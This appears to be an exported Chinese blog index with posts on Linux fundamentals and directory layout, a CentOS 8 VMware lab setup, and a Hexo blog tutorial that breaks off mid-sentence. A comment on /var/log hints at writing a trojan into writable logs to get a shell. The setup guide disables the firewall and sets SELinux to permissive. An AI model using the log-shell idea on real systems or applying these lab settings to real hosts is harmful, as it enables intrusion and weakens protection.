CFS（Linux完全公平调度器））平衡效率与公平性。\n\n\n内存管理\n分配&#x2F;回收物理内存和虚拟内存空间。\n实现 虚拟内存机制（通过分页&#x2F;分段技术将硬盘空间扩展为“虚拟RAM”）。\n\n\n中断与异常处理\n响应硬件中断（如键盘按下、网络数据到达）和软件异常（如除零错误）。\n每秒处理数万次中断（如系统时钟中断频率通常为 100–1000 Hz）。\n\n\n系统调用接口（Syscall）\n提供应用程序访问内核功能的唯一通道（如文件操作 open()、进程创建 fork()）。\n用户程序无法直接操作硬件，必须通过内核“代办”。\n\n\n设备驱动管理\n集成设备驱动程序（如显卡、声卡驱动），协调硬件与软件的通信。\n\n\n\n内核工作流程示例：启动程序\n用户双击应用图标 → Shell调用 exec() 系统调用。\n内核切换到内核态：\n分配内存空间 → 装载程序代码 → 创建新进程 → 调度CPU执行。\n\n\n程序运行时调用 printf() → 触发 write() 系统调用 → 内核将数据发送到终端。\n程序结束 → 内核回收内存，更新进程状态。\n\n例如：想要在电脑上播放音乐：\n1、内核让播放器占用CPU\n2、声卡驱动让数字信号变成电信号\n9、文件系统文件系统（File System） 是操作系统用来组织、存储和管理数据的核心机制。它定义了数据如何被命名、存储、检索及更新，将硬盘的原始存储空间转化为用户和程序可理解的逻辑结构（文件与目录）。\n核心功能\n命名与组织\n文件：存储数据的逻辑单元（文本、图片等），通过文件名（如 report.txt）标识。\n目录（文件夹）：分层结构（如 /home/user/docs/），实现文件分类管理。\n路径：定位文件的唯一标识（如 Linux 的 /etc/config，Windows 的 C:\\Program Files）。\n\n\n数据存储与寻址\n块（Block）：物理存储的最小单位（通常 4KB）。\n文件分割：大文件被拆分为多个块，分散存储在磁盘不同位置。\n元数据（Metadata）：记录文件属性（名称、大小、创建时间、权限、存储位置等）。\n例如：Linux 的 inode 存储元数据，但不包含文件名（文件名在目录中记录）。\n\n\n\n\n空间管理\n分配策略：标记已用&#x2F;空闲块（位图法、链表法）。\n碎片处理：\n外部碎片：空闲块分散 → 碎片整理（Defragmentation）合并连续空间。\n内部碎片：块未充分利用（如 1KB 文件占用 4KB 块）。\n\n\n\n\n数据可靠性与恢复\n日志（Journaling）：记录操作意图（如 ext4 的日志），崩溃后恢复一致性。\n冗余备份：RAID、副本机制（如 ZFS 的 Copy-on-Write）。\n\n\n\n主流文件系统对比\n\n\nFAT32\nU盘、老式设备\n跨平台（Win&#x2F;macOS&#x2F;Linux通用）\n单文件≤4GB，无日志、易碎片化\n\n\n\nNTFS\nWindows 主磁盘\n支持大文件（16EB）、ACL权限控制\nmacOS&#x2F;Linux 写入需额外驱动\n\n\nexFAT\n闪存设备（SD卡）\n轻量级、大文件支持（64ZB）\n无日志、数据恢复能力弱\n\n\next4\nLinux 主系统\n日志可靠、支持64位存储（1EB）\nWindows 不原生支持\n\n\nAPFS\nmacOS&#x2F;iOS\n针对SSD优化（写时复制）、加密强\n不兼容传统机械硬盘\n\n\nZFS\n企业级存储\n自愈校验、实时压缩、快照克隆\n内存占用高、复杂度大\n\n\n例如：在保存一个文件时：\n1、文件系统决定把它存放在哪 \n2、下次打开的时候，能够快速找到\n10、用户界面UI用户界面（User Interface, UI） 是人与计算机系统之间进行信息交换的媒介，是用户感知并操作数字世界的“窗口”。其核心目标是通过直观的交互方式降低技术使用门槛，让用户高效、无痛地达成目标。\nUI的核心作用​\t1、信息展示\n\n将计算机处理的数据转化为人类可理解的视觉&#x2F;听觉&#x2F;触觉反馈（如文字、图标、声音提示）。\n\n​\t2、操作入口\n\n提供用户向系统发送指令的途径（点击按钮、语音命令、手势等）。\n\n​\t3、降低认知负荷\n\n通过符合直觉的设计减少用户学习成本（如回收站图标表示删除文件恢复）。\n\nUI的三大类型1.命令行界面（CLI - Command Line Interface）\n\n形式：用户输入文本指令（如 rm -rf file.txt）。\n场景：服务器运维、开发者调试（Linux终端、Windows CMD）。\n优点：高灵活性、可脚本化批量操作。\n缺点：需记忆命令语法，对新手极不友好。示例：黑客电影中快速滚动的黑色终端窗口即CLI。\n\n2.图形用户界面（GUI - Graphical User Interface）\n\n形式：视觉化元素（窗口、图标、菜单、按钮）。\n交互方式：鼠标点击、键盘快捷键、触控手势。\n场景：桌面操作系统（Windows&#x2F;macOS）、手机APP、网页。\n关键组件：\nWIMP范式：窗口（Window）、图标（Icon）、菜单（Menu）、指针（Pointer）。\n控件库：按钮、输入框、滑块、复选框等。\n\n\n优点：直观易学，适合大众用户。示例：Windows桌面就是GUI的典型，拖动文件&#x3D;用户向系统发出移动数据指令。\n\n3. 自然用户界面（NUI - Natural User Interface）\n\n形式：模仿人类自然行为（语音、手势、眼神）。\n技术依赖：\n语音识别：Siri&#x2F;小爱同学唤醒智能家居\n计算机视觉：手势控制（如微软Kinect）、面部解锁\n触觉反馈：AR&#x2F;VR设备震动模拟触感\n\n\n场景：智能汽车控制、AR游戏（如Pokémon GO）、无障碍交互。\n演进方向：脑机接口（Neuralink）、全息交互（Meta元宇宙）。\n\n11、网络基础\n定义： 多台计算机或设备通过通信链路（有线或无线）连接起来，实现资源共享和信息交换。\n互联网： 全球最大的计算机网络。\n主要概念：\n协议： 设备通信的规则（如：TCP&#x2F;IP - 互联网的基础协议）。\nIP地址： 网络中设备的唯一标识符。\n域名系统： 将便于记忆的域名翻译成 IP 地址。\n万维网： 建立在互联网上的信息服务系统（网页、超链接等）。\n网络类型： 局域网、城域网、广域网。\n关键设备： 路由器、交换机、调制解调器。\n\n\n\n12、工作原理\n用户通过输入设备输入指令或数据。\n数据&#x2F;指令被送入内存。\nCPU 的控制单元从内存中取出指令进行解码。\nCPU 的运算器根据指令要求，从内存中取出数据进行运算。\n运算结果送回内存暂存或送到输出设备。\n结果通过输出设备呈现给用户或存储到外存设备。\n\n场景：在电脑上通过浏览器看视频，操作系统如何工作？\n1、打开浏览器 UI告诉内核，用户要打开浏览器\n2、内核分配内存以及CPU\n3、访问网络 网络驱动控制网卡下载视频\n4、观看视频 内核会同时处理视频解码、声音\n5、关闭浏览器，释放内存\n13、计算机科学与信息技术\n计算机科学： 侧重于计算理论、算法、编程语言、计算机体系结构、操作系统、人工智能等基础研究。\n信息技术： 侧重于应用计算机系统和网络解决实际问题，如系统管理、网络管理、数据库管理、软件开发（偏应用）、技术支持等。\n\n14、计算机的应用领域\n科学研究、工程设计与制造、通信与媒体、教育与学习、医疗保健、金融交易与服务、企业管理（ERP&#x2F;CRM）、人工智能（智能助手、自动驾驶）、娱乐（游戏、影视）、政府公共服务等。\n\n二、Linux是什么？Linux 是一种自由、开源、类 Unix 的操作系统内核，同时也是基于该内核构建的一整套操作系统和软件生态系统的统称。简单来说，Linux 是一个强大、稳定且高度可定制的计算机系统基础。\n1、核心是 Linux 内核：\n由芬兰程序员林纳斯·托瓦兹在 1991 年作为个人项目开始开发。\n它是最核心的部分，负责管理计算机的硬件资源（CPU、内存、磁盘、网络、外设等），并为软件（应用程序）提供运行的基础服务和接口。\n内核是操作系统的心脏，调度任务，管理文件系统，处理输入输出等。\n\n2、完整的操作系统 - Linux 发行版：\n单独的内核本身对普通用户来说无法直接使用。一个完整的、用户友好的操作系统需要包含：\n内核\n系统工具（如命令行 Shell bash）\n软件包管理系统（用于安装、更新和卸载软件）\n基本的库\n用户界面（图形用户界面 GUI 或命令行界面 CLI）\n各种应用程序（浏览器、办公软件、媒体播放器等）\n\n\n这就是 Linux 发行版的概念。不同的组织、公司或社区会将 Linux 内核、各种自由&#x2F;开源软件以及他们自己开发的管理工具打包在一起，形成可直接安装使用的操作系统，称为 发行版。\n常见的著名发行版：\nUbuntu： 用户友好，非常适合桌面用户和个人开发者入门。\nDebian： 非常稳定，Ubuntu 等许多发行版的基础。\nFedora： 由 Red Hat 支持，通常采用较新的技术。\nCentOS Stream &#x2F; Rocky Linux &#x2F; AlmaLinux： 企业级稳定性和长期支持的典范（尤其面向服务器）。\nopenSUSE： 以强大的配置工具和稳定性著称。\nArch Linux： 轻量、高度可定制，适合经验丰富的用户。\nLinux Mint： 基于 Ubuntu，对桌面用户极其友好，尤其是从 Windows 转过来的用户。\nKali Linux： 专注于网络安全测试和渗透测试。\n\n\n\n3、核心特性：\n开源与自由：\n开源： Linux 内核和构成发行版的大部分软件的源代码都是完全公开、可自由查看、修改的。这带来了巨大的透明度、安全性和协作创新的可能。\n自由： 用户拥有自由运行、学习、修改和重新分发软件（包括修改后的版本）的权利。这得益于其采用的许可证，主要是 GNU GPL。\n\n\n类 Unix： Linux 在设计哲学和接口上借鉴了成熟的 Unix 操作系统（如 POSIX 标准），使其具有强大的命令行工具、稳定性、多用户&#x2F;多任务能力以及高度可组合性（小工具组合完成复杂任务）。\n稳定性与可靠性： Linux 以其在服务器和高负载环境下的稳定性著称，通常可以持续运行数月甚至数年而无需重启。\n安全性： 得益于开源特性（漏洞更容易被发现和修复）、强大的权限系统设计以及活跃的社区响应，Linux 通常被认为比某些专有操作系统更安全。\n高可定制性： 用户可以从轻量级的纯命令行系统到功能丰富的桌面环境进行选择。几乎每个组件都可以被替换或调整以满足特定需求。\n免费： 绝大多数 Linux 发行版可以免费下载、安装和使用。商业支持通常面向企业级服务。\n广泛的硬件支持： 内核内置支持大量硬件，尤其是在服务器、嵌入式设备和超级计算机上。主流桌面硬件（尤其是较新的）支持也非常好。\n强大的社区支持： 拥有全球范围内庞大而活跃的用户和开发者社区，提供丰富的文档、教程、论坛和互助渠道。\n\n4、GPLv2Linux 内核采用 GNU General Public License version 2 (GPLv2) 作为其开源许可协议。理解 GPL 对理解 Linux 的核心运作理念至关重要：\nGPL 的核心宗旨（Copyleft 原则）1.保证自由：GPL 的根本目标是确保软件及其衍生作品始终保持自由。它授予用户四项核心自由：\n\n自由 0： 运行程序的自由，无论任何目的。\n自由 1： 学习和修改程序源代码的自由（获取源码是前提）。\n自由 2： 重新分发软件的自由，帮助他人。\n自由 3： 将修改后的版本分发给其他人的自由（这要求同时提供修改后的源代码，让社区受益）。\n\n2.“传感染”特性 (Copyleft)： 这是 GPL 最显著的特点。\n\n如果你分发基于 GPL 许可软件（如 Linux 内核）的修改版本或包含它的程序，整个分发也必须遵循 GPLv2。\n你必须向程序的接收者提供完整的、可修改的源代码。\n不能在分发时添加额外的限制（例如，不能禁止用户对软件进行反向工程、不能再许可、不能要求付费购买许可密钥等）。\n这种特性确保自由不会在后续分发中“流失”，自由软件网络会持续扩大。\n\nLinux 内核与 GPLv2 的具体关系1.版本选择：Linux 内核严格采用 GPLv2，不是较新的 GPLv3。林纳斯·托瓦兹 (Linus Torvalds) 和其他核心开发者对此选择有明确立场，主要涉及对 GPLv3 中某些条款（如对硬件限制如 Tivoization 的约束）的顾虑。\n2.动态加载模块： 这是一个复杂的法律边界问题。\n\n观点一（严格派）： 内核是 GPLv2 代码，任何动态链接到内核的模块（如驱动程序）都被认为与内核形成了一个整体作品，因此必须也是 GPLv2（或兼容）许可的。专有（闭源）内核模块违反了 GPL。\n观点二（宽松派 &#x2F; Linus 观点）： 如果内核模块只使用了内核公开的、稳定的、设计用于模块交互的 API（而不是直接访问内部函数或数据结构），并且是“非衍生的独立作品”，可能可以不是 GPL（虽然 LKML 社区强烈不鼓励闭源模块）。\n现实状况： 许多硬件厂商提供闭源驱动（二进制 blob），但这在法律上存在风险，也被开源社区认为违背了 GPL 的精神。社区和项目（如 FSF）持续努力用开源驱动替代闭源驱动。内核本身也提供了一些机制（如 EXPORT_SYMBOL_GPL）来标记只允许 GPL 模块调用的函数。\n\n3.用户空间程序不受此限：GPLv2 仅约束与 Linux 内核直接链接（形成组合作品）的程序，主要是内核模块。在 Linux 上运行的用户空间应用程序（如 Firefox, LibreOffice）不受内核 GPLv2 的限制。它们可以使用任何许可（GPL、LGPL、MIT、BSD、Apache 甚至是专有许可）。这是 GNU&#x2F;Linux 系统中“GNU”部分存在的原因之一——GNU 项目提供了在自由许可下的完整用户空间工具链。\nGPL 对 Linux 生态系统的意义1.成功的基石： GPL 是 Linux 成功的最关键因素之一。它确保了：\n\n源代码的开放性和可审计性： 任何人都可以检查、学习、改进代码，提高了安全性、可靠性和创新速度。\n广泛的协作开发： 企业（如 Red Hat, IBM, Intel, Google）和个人开发者都可以放心贡献，知道他们的贡献永远不会成为某家公司的私有财产。\n自由的保障： 用户可以确信自己拥有运行、修改和分发自由的权利，不会被供应商锁定。\n\n2.商业支持可行：GPL 允许公司基于 Linux 提供服务（技术支持、定制开发、云服务等）和分发商业发行版（如 RHEL, SUSE），只要它们遵守提供源码的义务（主要针对内核本身的修改）。红帽模式（提供开源代码，销售服务订阅）是成功的典范。\n3.巨大的社区和碎片化：GPL 催生了庞大的开发者社区和数量众多的发行版（Debian, Ubuntu, Fedora, Arch 等）。虽然碎片化可能是个挑战，但也提供了巨大的选择和灵活性。\n与其他开源许可的主要区别\n宽松许可 (MIT, BSD, Apache)： 允许修改版以专有闭源形式再发布（只要求保留版权声明）。用户自由在后续分发中可能丢失。例子：FreeBSD, Android ASOP。\n弱 Copyleft (LGPL)： 主要设计用于库，允许专有代码链接到 LGPL 库而不“感染”整个程序（只要遵守 LGPL 对库本身的条款）。例子：Glibc, GTK。\nGPL (Strong Copyleft)： 要求组合作品或衍生作品整体都必须保持 GPL（提供源码）。如 Linux 内核。例子：Linux kernel, GIMP, GCC。\nAGPL： 针对网络服务，如果修改后通过网络提供软件服务，也必须提供对应的源代码。例子：MongoDB (曾用过)， Nextcloud。\n\n5、Linux与UnixLinux 与 Unix 的关系非常密切，但又有本质区别。可以说 Linux 是 Unix 思想的继承者和发展者，但不是 Unix 代码的直系后代。它们共同构成了“Unix-like”操作系统家族的核心。理解它们的关系需要从历史、技术、许可和生态几个维度来看：\n1. Unix：开创者与标准\n起源 (1969)： 诞生于 AT&amp;T 的贝尔实验室（Ken Thompson, Dennis Ritchie 等人）。用 C 语言重写后（1973 年左右），其可移植性为普及奠定了基础。\n**关键特征：**引入了许多奠基性的概念：\n“一切皆文件”： 统一的文件、设备和进程间通信抽象。\n小型、单一目的工具： grep, sed, awk, ls, cat 等，可通过管道 | 组合 (command1 | command2)，遵循“组合优于继承”原则。\n层次化文件系统： root (/) 下的树状结构。\n多用户、多任务： 同时支持多个用户运行多个程序。\n内置强大 Shell： 作为用户和系统交互的主要界面。\n\n\n许可与分裂：\n早期： AT&amp;T 开始向学术界和商业机构提供源代码许可。\n**衍生分支：**不同机构在 AT&amp;T Unix 源码基础上发展出众多变体：\nBSD (Berkeley Software Distribution): 加州大学伯克利分校开发，产生了 FreeBSD、NetBSD、OpenBSD 等。\n商业 Unix: Sun Solaris (SunOS)、IBM AIX、HP-UX、SCO UnixWare、ATT System V 等。\n\n\n“Unix 战争”： 各个商业版本在标准化上竞争激烈，存在互不兼容问题。\n\n\n标准： 为解决兼容性问题，诞生了 POSIX (Portable Operating System Interface) 标准（由 IEEE 指定）。它定义了操作系统为兼容 Unix 风格所需提供的最小 API 接口标准（如系统调用、shell 行为等）。\n\n2. Linux：开源的新兴力量\n**起源 (1991)：**由芬兰大学生 Linus Torvalds开发，初衷是创建一个 免费、开源的类 Unix 内核。\n关键背景：GNU 计划 (1983年启动，Richard Stallman)：目标是创建一个完全自由的操作系统 GNU，在1991年时几乎完成了所有用户空间工具 (GCC, glibc, bash, coreutils 等)，但唯独缺少一个成熟可用的内核（GNU Hurd 进展缓慢）。\n\n\n核心特点：\n只是内核 (Kernel)： Linux 本身不是完整的操作系统，只是系统的核心（管理硬件、进程、内存等）。用户空间工具主要来自 GNU。\n开源自由： 采用 GPLv2 许可证，保证了其自由传播、修改和使用的权利。\n设计理念： 严格遵循 Unix 哲学，但 不包含任何原始的 AT&amp;T Unix 源代码（是干净的重新实现，避免了法律纠纷）。\n高度模块化： 支持动态加载内核模块。\n可移植性强： 支持极其广泛的硬件架构（从超级计算机到嵌入式设备）。\n\n\nLinux 发行版 (Linux Distribution)： 一个 完整的操作系统通常 &#x3D; Linux 内核 + GNU 工具链&#x2F;库 + 其他软件（桌面环境、包管理器、应用等）  + 集成安装&#x2F;配置工具。常见的发行版包括：\n商业支持： Red Hat Enterprise Linux (RHEL)、SUSE Linux Enterprise Server (SLES)、Ubuntu Pro (Canonical)。\n社区驱动： Debian、Ubuntu (社区版本)、Fedora (RHEL 上游)、openSUSE (SLES 上游)、Arch Linux、Gentoo 等。\n\n\n\n3. Linux 与 Unix 的关键关系与区别\n\n\n特征\nUnix (传统的，如 System V, BSD, AIX, Solaris)\nLinux\n\n\n\n血统\n直接或间接来源于 AT&amp;T 贝尔实验室的原始 Unix 源代码。\n独立开发，不包含任何 AT&amp;T Unix 源码。是一个全新的实现，遵循 Unix 设计理念。\n\n\n内核\n单一内核（Monolithic Kernel）或混合内核设计。不同分支内核名称各异（如 Solaris Kernel）。\nLinux 内核（也是单一内核设计）。\n\n\n许可\n历史上多为专有许可：商业 Unix 要求高昂的许可费。BSD 系统采用宽松的开源协议（如 BSD License，允许闭源再分发）。\n内核采用 GPLv2（强 Copyleft）。用户空间工具多为 GPL 或 LGPL。核心原则是自由和开源。\n\n\n所有权\n历史上由 AT&amp;T 所有，后分裂为多个商业实体所有（IBM, Oracle, HPE 等）。BSD 由社区维护。\n不属于任何单一实体。由社区（个人和公司）共同开发维护。Linux 商标归 Linus Torvalds 所有。\n\n\n标准化\nPOSIX 标准的最初目标对象。各大商业版本曾试图主导自己的标准。\n完全兼容 POSIX 标准（遵循其 API 和 shell 行为规范）。\n\n\n开发模型\n历史上是闭源专有开发。BSD 系列采用开源社区协作模式。\n大规模的开源协作模式。任何人都可以参与贡献代码（通过邮件列表、Git）。版本控制明确（Git）。\n\n\n变体&#x2F;碎片化\n形成了多个不兼容的商业分支（Solaris, AIX, HP-UX）。BSD 分支（FreeBSD, OpenBSD, NetBSD）相对独立但更兼容。\n存在大量发行版（数百个），它们在 软件包管理、默认配置、打包策略、桌面环境、支持周期 上差异很大。但都使用同一个 Linux 内核（不同版本），应用层兼容性较好（POSIX + 发行版差异）。\n\n\n硬件支持\n传统商业 Unix 通常紧密绑定厂商特定的硬件（RISC 架构，如 SPARC, Power）。\n支持极其广泛的硬件架构：x86&#x2F;x86_64, ARM, RISC-V, POWER, MIPS, 等等。硬件驱动生态系统庞大（开源社区驱动 + 厂商贡献）。\n\n\n用户 &amp; 用途\n传统上用于高端服务器、工作站和大企业关键任务系统。成本高昂。\n无处不在：超级计算机、服务器集群、云计算、数据中心、嵌入式系统、路由器、智能手机(Android 基于 Linux 内核)、桌面&#x2F;笔记本电脑。\n\n\n6、主要应用领域：\n服务器： Linux 是互联网的基石。绝大部分的 Web 服务器、云服务器、数据库服务器等都运行 Linux。\n超级计算机： 全球性能最强的超级计算机几乎都运行基于 Linux 的系统。\n嵌入式设备： 智能手机（Android 基于 Linux 内核）、路由器、智能电视、物联网设备、车载娱乐系统等。\n开发者工作站： 命令行工具、软件包管理和开发环境使其成为开发者的首选，尤其在 Web 开发、云计算、数据科学、人工智能等领域。\n桌面电脑： 越来越多的用户将 Ubuntu、Fedora、Mint 等作为日常使用的操作系统，替代 Windows 或 macOS。\n基础设施： 路由器、防火墙、NAS 存储等网络设备大量使用 Linux。\n\n三、Linux目录结构1/            #根目录\n\n起始点，系统上所有的文件都存在这里\n1/root /home  #家目录\n\n1/root        #存放root的配置文件\n\n1/home        #存放用户的普通文件\n\n12345678910111213141516171819202122/etc                                    #系统配置目录/etc/sysconfig/network-scripts          #网卡配置文件/etc/yum.repos.d/CentOS-Base.repo       #操作系统软件包/etc/yum.repos.d/CentOS-AppStream.repo  #应用流软件包/etc/yum.repos.d/CentOS-Extras.repo     #额外软件补充包mirrorlist                              #两种指定仓库位置的配置方式，他的工作方式：直接指定仓库                                        #工作流程：直接访问指定的URL，下载仓库数据                                        #如果地址不可达，会报错baseurl                                 #先访问mirrorlist url的获取镜像地址列表                                               #下载出列表，并开始测试响应速度                                        #选择出最优的镜像进行连接，下载仓库数据                                       SElinux                                 #美国国家安全局提出的概念：强制访问控制安全机制，用于增强linux的安全性                                            #自主访问控制安全机制 rw                                        #三种模式：                                        #enforcing：强制模式（默认）：严格执行安全策略的，违规操作会被阻止                                        #permissive：标准模式/宽容模式：会允许并记录                                        #disable：禁用，完全关闭并记录                                                         #SElinuxTYPE：targeted：仅保护安全进程；mls：多级安全策略，用于军事领域\n\n123/dev               #设备文件目录                   #存放的是所有硬件设备                   #权限：仅仅只有root或disk用户组有操作权限\n\n12/bin               #系统命令目录/sbin              #管理员级系统命令，专供超级管理员（root用户）使用\n\n为什么linux要把所有命令存放在目录？单用户模式（救援模式、维护模式）下依然可以使用，多为系统运行必需的命令。\n123456789101112131415/var                #存储动态变化的数据目录，会随着系统运行不断增长/var/log            #系统和服务日志（如syslog、nginx/access.log）。在能够写入日志的情况下，写入木马，获取shell/var/lib            #应用程序数据（如 MySQL 数据库/var/lib/mysql）。mysql数据库、docker容器/var/spool          #队列数据（如邮件队列 /var/spool/mail）。/var/log/secure     #安全认证日志（如 SSH 登录记录）。/var/log/messages   #核心系统日志（替代通用 syslog）/tmp                #存放临时文件，全局可读写的，重启会清空/usr                #存储的是静态的用户进程、用户命令、库文件、共享数据\n\n数据性质：&#x2F;var 动态变化；&#x2F;tmp 临时数据；&#x2F;usr 静态只读\n是否可以删除？:&#x2F;var 是部分可删；&#x2F;tmp 可删；&#x2F;usr不可删\n是否需要备份？：&#x2F;var部分需要备份（数据库）；&#x2F;tmp不需要备份；&#x2F;user不需要备份\n文件大小？&#x2F;var  10G 以上，日志可能会膨胀；&#x2F;tmp  1G 以内；&#x2F;usr   5G - 20G 左右 Linux 基础系统\n分区情况：&#x2F;var 建议单独分区；&#x2F;tmp 通常会挂载为tmpfs；&#x2F;usr 通常和&#x2F;合并\n123/boot                #是启动linux系统所需的核心文件                     #内核kernel就i是存放在这里面                     #临时根文件系统\n\n1/lib\t             #核心共享库和内核模块\n\n1/proc\t             #内核与进程虚拟文件系统（实时系统状态）\n\n1/sys                 #硬件设备虚拟文件系统（配置内核参数）\n\n1/opt                 #第三方软件（大型独立应用）\n\n1/mnt                 #临时挂载点（手动挂载设备）\n\n1/media               #可移动设备自动挂载点\n\n\n\n四、Linux：一切皆文件123456789101112131415161718192021222324252627282930touch filename                   #创建文件touch file1 file2                #批量创建文件mkdir dir1                       #创建目录mkdir -p dir1/dir2               #创建嵌套目录结构mkdir -m 750 dir1                #创建权限为 drwxr-x--- 的目录cp 1.txt dir1                    #复制文件到目录cp -r dir1 dir2                  #复制目录mv 1.txt 2.txt                   #重命名mv 1.txt dir1                    #移动文件到目录rm -r dir1                       #删除目录rm -f dir1                       #强制删除rm -rf dir1                      #强制删除目录及内容#慎用！多用mv 少用rmvim 1.txt                        #打开 Vim 文本编辑器来创建或编辑名为 1.txt 的文件cat 1.txt                        #查看文件内容less                             #分页查看文件cat filename | less tail                             #查看文件末尾  tail -n 20 filename              #查看文件末尾20行tail -f app.log | grep &quot;ERROR&quot;   #实时跟踪日志文件并过滤出包含&quot;ERROR&quot;的行\n\n","slug":"Linux基础","date":"2025-07-29T02:38:02.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"1991d92d523634790e777614ebed22a2","title":"CentOS 8 环境搭建及配置","content":"CentOS 8 虚拟机搭建及配置一、下载安装Vmware Workstation在网上找教程，这里使用Vmware Workstation Pro 17\n二、下载CentOS 8 虚拟机镜像源在网上找下载地址，这里不做提供\n一、创建CentOS 8 虚拟机1、打开Vmware Workstation创建虚拟机点击右上角文件，新建虚拟机\n\n选择自定义，点击下一步\n\n硬件兼容性，这里选择Workstation 17.x，在新版本创建的虚拟机如果想在老版本使用可能会出错，点击下一步\n\n点击稍后安装操作系统，点击下一步\n\n客户机操作系统选择Linux，版本选择CentOS 8 64位，点击下一步\n\n修改虚拟机名称（建议修改，这样可以知道自己在什么时间创建了这个虚拟机，后续要用是能知道是干什么的），修改位置（建议不要放在C盘），点击下一步\n\n选择处理器数量，用来学习，1个就行，每个处理器的内核数量设置为2，点击下一步\n\n修改虚拟机内存4GB，点击下一步\n\n网络连接设置为NAT，点击下一步\n\n点击下一步\n\n点击下一步\n\n磁盘设置为创建新虚拟磁盘，点击下一步\n\n磁盘大小20GB，点击将虚拟磁盘存储为单个文件，点击下一步\n\n点击下一步\n\n点击自定义硬件，这里需要修改虚拟机硬件\n\n点击下方添加按钮，点击网络适配器，点击完成\n\n可以看到多了一个网络适配器2，点击关闭\n\n最后点击完成\n\n找到刚刚创建好的新虚拟机，点击编辑虚拟机设置，找到CD&#x2F;DVD，点击使用ISO映像文件，找到下载的CentOS 8 的iso文件，点击确定\n\n这样新建虚拟机就完成了。\n2、打开创建好的虚拟机开启此虚拟机，选择Install CentOS Linux 8，回车\n\n选择中文，简体中文，点击继续\n\n点击进入软件选择，找到传统UNIX兼容性、开发工具，勾上，点击完成\n\n点击安装目标位置，选择磁盘，点击完成\n\n点击网络和主机名，修改主机名，点击应用，选择以太网（ens160），打开，点击完成\n\n点击时间和日期，修改地址为上海，点击完成\n\n基本设置完成后点击开始安装\n\n设置root密码，点击完成\n\n创建一个用户，设置密码，点击完成\n\n都完成后等待安装\n\n安装完成后点击重启\n\n授权许可后登录root用户，在未列出里输入root，密码，即可登录\n\n现在这个界面右键选项里没有控制台，需要更改以下设置，点击右上角注销root用户，重新登录root用户时在登录左边的按钮选择经典，然后点击登录\n\n现在右键即可打开控制台\n\n现在在此界面拍摄一次快照，名称改为初始安装，便于日后使用\n\n3、对虚拟机进行配置关闭防火墙首先输入命令查看防火墙\n1systemctl status firewalld.service\n\n\n需要先临时关闭防火墙，再禁用防火墙\n12systemctl stop firewalld.servicesystemctl disable firewalld.service\n\n\n设置SELinux1vim /etc/selinux/config\n\n\n将SELINUX&#x3D;enforcing修改为SELINUX&#x3D;permissive\n\n关闭虚拟网卡查看虚拟网卡状态\n1systemctl status libvirtd.service\n\n\n关闭虚拟网卡\n1systemctl disable libvirtd.service\n\n\n换源1vim /etc/yum.repos.d/CentOS-AppStream.repo\n\n\n注释mirrorlist，取消注释beaseurl，将他的值更换成\n1https://mirrors.aliyun.com/centos-vault/8.5.2111/extras/$basearch/os/\n\n\n同样的方法修改\n12vim /etc/yum.repos.d/CentOS-Base.repovim /etc/yum.repos.d/CentOS-Extras.repo \n\n\n\n清除旧缓存，加载新源数据\n12yum clean all  #删除所有缓存的软件包数据（包括旧的软件包头文件、元数据、下载的软件包等）yum makecache  #从配置的软件仓库（Repository）下载最新的软件包列表、依赖关系等元数据，并存储在本地\n\n\n最后保存快照\n\n","slug":"CentOS-8-环境搭建及配置","date":"2025-07-28T13:51:19.000Z","categories_index":"","tags_index":"教程","author_index":"wyf"},{"id":"d69852fb48fa32246d1e3f9497c9ab8f","title":"Hexo个人博客搭建教程","content":"Hexo个人博客搭建教程一、准备工具1、Typora软件简介Typora 是一款轻便简洁的 Markdown 编辑器，将写作与预览窗口相结合，采用所见即所得的编辑模式，具有实时预览、语法扩展等诸多特色功能。在接下来的个人博客搭建过程中会使用到Markdown文件，建议安装使用Typora。\n安装过程下载地址：https://www.typoraio.cn/\n\n得到下载文件后双击安装，一直Next下一步，选择安装地址，安装完成后打开使用。\n2、Nodejs软件简介Node.js 是一个强大的、基于 JavaScript 和 V8 引擎的运行时环境，利用事件驱动、非阻塞 I&#x2F;O 模型实现了高性能，尤其擅长构建可扩展的网络应用和实时服务，并拥有npm这一巨大的开源生态系统作为后盾。它是现代全栈 JavaScript 开发的基础。\n安装过程下载地址：https://nodejs.org/zh-cn/download\n\n修改安装路径，一直Next下一步即可，建议保留Add to PATH，这样后续就不用在环境变量中配置，可以直接在全局使用Node命令，在控制台命令行输入可以验证安装\n1node -v\n\n1npm -v\n\n\n3、Git软件简介Git 是一个分布式版本控制系统（DVCS），由 Linus Torvalds（Linux 内核创始人）于 2005 年开发。其核心功能是：\n\n追踪文件变更：记录代码、文档的每一次修改\n多人协作：支持多人并行开发同一项目\n灾难恢复：可回溯到任意历史版本\n\n安装过程下载地址：https://git-scm.com/downloads/win\n\n选择合适的版本进行下载，Git官网提供两种类型：\n\nStandalone Installer（独立安装程序）：常规的安装包，会在系统中进行完整安装，写入系统注册表等，将 Git 集成到系统环境，安装后可在命令行等环境直接调用，是最常用的安装方式，比如 “Git for Windows&#x2F;x64 Setup” 这类，适合长期在固定电脑使用 Git 的场景 。\nPortable (“thumbdrive edition”，便携版 &#x2F; 拇指驱动器版)：无需安装，解压或拷贝后即可使用，不写入系统注册表，可放在 U 盘等移动存储设备，在不同电脑即插即用，像 “Git for Windows&#x2F;x64 Portable” ，方便在多台电脑临时使用 Git 且不想在每台电脑都安装的情况 。\n\n下载完成后双击打开文件，选择安装路径，一直Next下一步即可，安装完成会打开一个Git的介绍网页。\n4、Hexo软件简介Hexo 是一个基于 Node.js 的开源静态博客生成器，通过解析 Markdown 文件和模板，生成纯 HTML&#x2F;CSS&#x2F;JS 网站。核心定位：为开发者、写作者提供高效内容发布和极简技术栈维护的解决方案。\n安装过程使用管理员身份打开打开Windows控制台，下载命令：\n1npm install hexo-cli -g     #全局安装\n\n\n安装完成后输入命令去验证：\n1hexo -v\n\n\n二、本地博客部署需要从 GitHub 克隆 Hexo 官方模板仓库，在E盘空白处右键，点击Open Git Bash here（安装完Git就会出现）\n\n弹出如下界面\n\n输入命令\n1hexo init blog\n\n\n会提示 Please run ‘npm install’ in “E:\\blog” folder.\n用管理员身份打开cmd，进入E:\\bolg目录下\n1cd /d E:\\blog\n\n输入命令\n1npm install\n\n安装完成后显示如下界面\n\n\n如果在npm install这一步没有使用管理员打开cmd，而是进入blog文件里面，通过git bash输入npm install，可能会报错\n\n这里错误代码时4048，通过查阅发现可能就是权限不够的问题，因此通过管理员打开控制台再输入npm 